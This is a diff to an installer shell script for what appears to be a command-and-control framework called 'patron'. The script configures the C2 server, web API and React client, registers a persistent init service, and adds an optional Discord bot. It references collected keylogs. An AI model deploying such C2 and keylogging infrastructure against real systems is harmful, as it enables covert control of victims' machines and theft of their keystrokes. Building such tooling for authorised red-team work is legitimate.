@@ -1,9 +1,15 @@
 #!/bin/bash
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root" 
+   exit 1
+fi
 
 base64=$(which base64)
 openssl=$(which openssl)
 npm=$(which npm)
 npm=$(which go)
+dir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
+dirsedsafe=$(printf '%s\n' "$dir" | sed -e 's/[]\/$*.^[]/\\&/g');
 
 #base64 check
 if [ -x $base64 ]; then
@@ -51,15 +57,19 @@ echo "Setting up agents dir"
 
 # Set Env file
 echo "Setting environment variables"
-echo "Note: Webserver and C2 server can't be on the same port and must be an unused port"
+echo "Note: Webserver, ReactClient and C2 server can't be on the same port and must be an unused port"
 rm -rf .env
 rm -rf Web/client/.env
 touch .env
-read -p "Enter WEBSERVER IP: " webserverip
-read -p "Enter WEBSERVER PORT: " webserverport
+read -p "Enter APISERVER IP: " webserverip
+read -p "Enter APISERVER PORT: " webserverport
+read -p "Enter REACTCLIENT IP: " reactclientip
+read -p "Enter REACTCLIENT PORT: " reactclientport
 echo "Note: To listen on all inteface, leave C2SERVER IP blank"
 read -p "Enter C2SERVER IP: " c2serverip
 read -p "Enter C2SERVER PORT: " c2serverport
+echo "Note: Leave discord bot token blank if you don't want"
+read -p "Enter DISCORD BOT TOKEN: " bottoken
 encpubkey=`base64 -w 0 certs/server.pem`
 
 # server env
@@ -68,10 +78,13 @@ echo "WEBSERVER_PORT=$webserverport" >> .env
 echo "C2SERVER_IP=$c2serverip" >> .env
 echo "C2SERVER_PORT=$c2serverport" >> .env
 echo "PUBLIC_KEY=$encpubkey" >> .env
+echo "BOT_TOKEN=$bottoken" >> .env
 
 #webclient env
 echo "REACT_APP_WEBSERVER_IP=$webserverip" >> Web/client/.env
 echo "REACT_APP_WEBSERVER_PORT=$webserverport" >> Web/client/.env
+echo "HOST=$reactclientip" >> Web/client/.env
+echo "PORT=$reactclientport" >> Web/client/.env
 
 read -p "Do you want to reset the database (this will clear any keylogs) (y/n): " resetchoice
 
@@ -90,21 +103,24 @@ go mod tidy
 
 echo "Installing node modules..."
 
-cd Web/client && npm install && cd ../../ 
+cd Web/client && npm install && cd ../../
+
+# configure patron service
+mkdir /var/log/patron
+sed -i "s/SCRIPT_FILE/$dirsedsafe/g" $dir/patron.service
+cp $dir/patron.service /etc/init.d/patron
+chmod 755 $dir/service_script.sh
+chmod 755 /etc/init.d/patron
+git -C $dir restore patron.service
+systemctl enable patron
+systemctl start patron
+
 echo ""
 echo ""
 echo ""
+echo "Run 'cd Web/client && npm start' to start start the web client"
 echo ""
-echo "    Use Compiled binary      "
-echo "Run './build/server' to start the C2 Server"
-echo "Run './build/webserver' to start the Web Server"
-echo "Run 'cd Web/client && npm start' to start the Web Client"
+echo "Run 'sudo go run bot/bot.go' to start the Discord Bot if the DISCORD BOT_TOKEN Was provided"
 echo ""
 echo ""
-echo "            OR               "
 echo ""
-echo ""
-echo "       Go installed?         "
-echo "Run 'go run server/server.go' to start the C2 Server"
-echo "Run 'go run Web/server/webserver.go'"
-echo "Run 'cd Web/client && npm start' to start the Web Client"
